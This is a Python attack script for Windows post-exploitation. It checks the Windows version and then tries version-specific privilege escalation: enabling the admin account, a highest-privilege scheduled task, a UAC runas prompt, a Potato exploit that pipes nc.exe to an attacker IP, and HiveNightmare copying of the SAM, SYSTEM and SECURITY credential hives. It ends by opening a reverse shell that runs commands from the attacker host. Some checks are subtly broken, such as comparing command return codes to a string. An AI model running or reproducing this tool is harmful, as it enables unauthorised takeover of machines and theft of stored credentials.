import os
import platform
import ctypes
import subprocess
import socket
import sys
from time import sleep

# Set as current directory
JUICY_POTATO_PATH = "C:/Users/Public/Downloads/JuicyPotato.exe"
GOD_POTATO_PATH = "C:/Users/Public/Downloads/JuicyPotato.exe"

def check_admin_privileges():
    """
    Check if the script is running with admin privileges.
    Returns True if admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        return False


def elevate_privileges():
    """
    Attempt to elevate privileges by re-running the script with admin rights.
    UAC prompt will appear for privilege escalation.
    """
    try:
        if not check_admin_privileges():
            print("[*] Attempting to elevate privileges via UAC...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception as e:
        print(f"[-] Privilege escalation failed: {e}")


def detect_windows_version():
    """
    Detect the Windows version.
    """
    version = platform.release()
    print(f"[*] Detected Windows version: {version}")
    return version


def windows_xp_escalation():
    """
    Example escalation for Windows XP.
    Exploit legacy service vulnerabilities, misconfigurations, etc.
    """
    print("[*] Running Windows XP specific escalation...")
    os.system('net user admin /active:yes')  # Example: enabling disabled admin account


def windows_7_escalation():
    """
    Example escalation for Windows 7.
    Token manipulation, UAC bypass, or known exploits (e.g., MS10-092).
    """
    print("[*] Running Windows 7 specific escalation...")
    os.system(
        'schtasks /create /tn escalatetask /tr C:\\Windows\\System32\\cmd.exe /sc onlogon /rl highest')  # High-privileged task


def windows_10_escalation():
    """
    Example escalation for Windows 10.
    Use techniques like JuicyPotato or SeImpersonatePrivilege abuse.
    """
    print("[*] Running Windows 10 specific escalation...")
    subprocess.call(['powershell.exe', '-Command', 'Start-Process cmd.exe -Verb runAs'])  # Launch elevated process


def run_potato_exploit():
    print('[*] Running God exploit...')
    try:
        cmd = [GOD_POTATO_PATH, '-cmd', '/c', 'C:\\Users\\Public\\Downloads\\nc.exe', '192.168.65.132', '4444', '-e', 'cmd']
        subprocess.run(cmd, check=True)
        print('[+] Privilege escalation complete. Elevated shell opened.')
    except Exception as e:
        print(f'[-] Exploit failed: {e}')


# def run_potato_exploit():
#     print("[*] Running JuicyPotato exploit...")
#     try:
#         # Execute JuicyPotato with CLSID for privilege escalation
#         cmd = [
#             JUICY_POTATO_PATH,
#             "-l", "4444",  # Listening port
#             "-p", "cmd.exe",
#             "-t", "*",
#         ]
#         subprocess.run(cmd, check=True)
#         print("[+] Privilege escalation complete. Elevated shell opened.")
#
#         # After privilege escalation, establish a reverse shell
#         establish_reverse_shell()
#     except Exception as e:
#         print(f"[-] Exploit failed: {e}")


def windows_11_escalation():
    """
    Privilege escalation for Windows 11, using the HiveNightmare vulnerability (CVE-2021-36934).
    """
    print("[*] Running Windows 11 specific escalation using HiveNightmare...")

    try:
        # Attempt to copy sensitive hives for exploitation
        sam_status = os.system('copy C:\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM')
        system_status = os.system('copy C:\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM')
        security_status = os.system('copy C:\\Windows\\System32\\config\\SECURITY C:\\Users\\Public\\SECURITY')
        if (sam_status != "Access Denied" and system_status != "Access Denied" and security_status != "Access Denied"):
            print("[+] HiveNightmare exploit executed, SAM and SYSTEM files copied.")
    except Exception as e:
        print(f"[-] Windows 11 escalation failed: {e}")
        return e


def privilege_escalation():
    """
    Based on the detected Windows version, attempt the appropriate privilege escalation method.
    """
    windows_version = detect_windows_version()

    if windows_version == "XP":
        windows_xp_escalation()
    elif windows_version == "7":
        windows_7_escalation()
    elif windows_version in ["8", "8.1"]:
        windows_7_escalation()  # Reuse similar techniques as Windows 7
    elif windows_version == "10":
        windows_10_escalation()
    elif windows_version == "11":
        windows_11_escalation()
    else:
        print("[-] Unsupported Windows version or not detected.")


def establish_reverse_shell():
    """
    Connect to the attacker's machine to establish a reverse shell.
    """
    attacker_ip = "192.168.65.132"  # Replace with your IP
    attacker_port = 4444  # Replace with desired port

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        s.send(b"[+] Connection established! Type 'exit' to end session.\n")

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            s.send(result if result else b"[+] Command executed, no output.\n")
    except Exception as e:
        print(f"[-] Reverse shell failed: {e}")
    finally:
        s.close()


def main():
    try:
        print("[*] Starting automated privilege escalation...")
        if check_admin_privileges():
            print("[+] Running with administrator privileges!")
            establish_reverse_shell()
        else:
            print("[*] Not running as admin, attempting privilege escalation...")
            elevate_privileges()
            privilege_escalation()
            try:
                # TRy potato
                run_potato_exploit()
            except Exception as e:
                print(e)
            sleep(3)  # Give time for UAC prompt completion
            if check_admin_privileges():
                print("[+] Privileges elevated successfully.")
                establish_reverse_shell()
            else:
                print("[-] Failed to obtain administrator privileges.")
    except KeyboardInterrupt as e:
        print("Closing shell")
        return None


if __name__ == "__main__":
    main()
